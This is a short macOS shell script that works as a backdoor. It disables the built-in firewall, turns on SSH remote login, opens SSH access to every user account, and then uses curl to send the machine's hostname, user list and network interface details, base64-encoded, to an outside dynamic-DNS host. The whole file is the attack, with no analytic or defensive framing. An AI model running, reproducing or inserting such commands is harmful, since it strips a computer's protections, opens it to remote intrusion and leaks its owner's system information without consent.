#disable firewall
sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0
#enable ssh
sudo systemsetup -f -setremotelogin on
#give ssh access to every user
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled
#send info
curl "pipie.ddns.net:23232" -d "localhostname=$(/usr/sbin/scutil --get LocalHostName | base64 | tr -- '+=/' '-_~')\&users=$(dscl . list /Users | grep -v '^_' | base64 | tr -- '+=/' '-_~')\&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')"
